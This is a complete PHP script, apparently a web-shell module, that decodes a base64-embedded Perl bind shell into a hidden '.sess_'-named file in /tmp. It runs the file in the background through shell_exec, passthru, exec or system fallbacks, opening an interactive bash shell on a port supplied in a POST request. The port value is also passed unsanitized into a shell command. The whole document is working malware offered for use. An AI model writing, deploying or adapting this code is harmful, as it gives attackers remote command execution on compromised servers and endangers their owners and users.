<?php
function sess_fname() { 
	return '.sess_'.md5(mt_rand());
}


$bind_pl = "IyEvdXNyL2Jpbi9lbnYgcGVybA0KJFNIRUxMPSIvYmluL2Jhc2ggLWkiOw0KaWYgKEBBUkdWIDwg
MSkgeyBleGl0KDEpOyB9DQokTElTVEVOX1BPUlQ9JEFSR1ZbMF07DQp1c2UgU29ja2V0Ow0KJHBy
b3RvY29sPWdldHByb3RvYnluYW1lKCd0Y3AnKTsNCnNvY2tldChTLCZQRl9JTkVULCZTT0NLX1NU
UkVBTSwkcHJvdG9jb2wpIHx8IGRpZSAiZXJyb3I6IHNvY2tldFxuIjsNCnNldHNvY2tvcHQoUyxT
T0xfU09DS0VULFNPX1JFVVNFQUREUiwxKTsNCmJpbmQoUyxzb2NrYWRkcl9pbigkTElTVEVOX1BP
UlQsSU5BRERSX0FOWSkpIHx8IGRpZSAiZXJyb3I6IGJpbmRcbiI7DQpsaXN0ZW4oUywzKSB8fCBk
aWUgImVycm9yOiBsaXN0ZW5cbiI7DQp3aGlsZSgxKQ0Kew0KYWNjZXB0KENPTk4sUyk7DQppZigh
KCRwaWQ9Zm9yaykpDQp7DQpkaWUgImVycm9yOiBmb3JrIiBpZiAoIWRlZmluZWQgJHBpZCk7DQpv
cGVuIFNURElOLCI8JkNPTk4iOw0Kb3BlbiBTVERPVVQsIj4mQ09OTiI7DQpvcGVuIFNUREVSUiwi
PiZDT05OIjsNCmV4ZWMgJFNIRUxMIHx8IGRpZSBwcmludCBDT05OICJlcnJvcjogZXhlYyAkU0hF
TExcbiI7DQpjbG9zZSBDT05OOw0KZXhpdCAwOw0KfQ0KfQ0K";


function exec_method($cmd) {
	$retval = true;
	if(is_callable('shell_exec')) { 
		$ret_exec=shell_exec($cmd); 
	} else if (is_callable('passthru')) { 
		ob_start(); 
		passthru($cmd); 
		$ret_exec=ob_get_contents(); 
		ob_end_clean();
	} else if (is_callable('exec')) { 
		$ret_exec=array(); 
		exec($cmd,$ret_exec); 
	} else if (is_callable('system')) { 
		ob_start(); 
		system($cmd); 
		$ret_exec=ob_get_contents(); 
		ob_end_clean(); 
	} 
	return $retval;
}

$uniqfn = '/tmp/' . sess_fname();


@$fh=fopen($uniqfn,"ab+");
@fwrite($fh,base64_decode($bind_pl));
@fclose($fh);
$command = 'perl ' . $uniqfn . ' ' . $_POST['port'] . ' > /dev/null &';
if (exec_method($command)) 
    echo '<p>Perl Bindshell (should be) listening on ' . htmlspecialchars($_POST['ip']) . ':' . htmlspecialchars($_POST['port']) . '</p>';

exit;
?>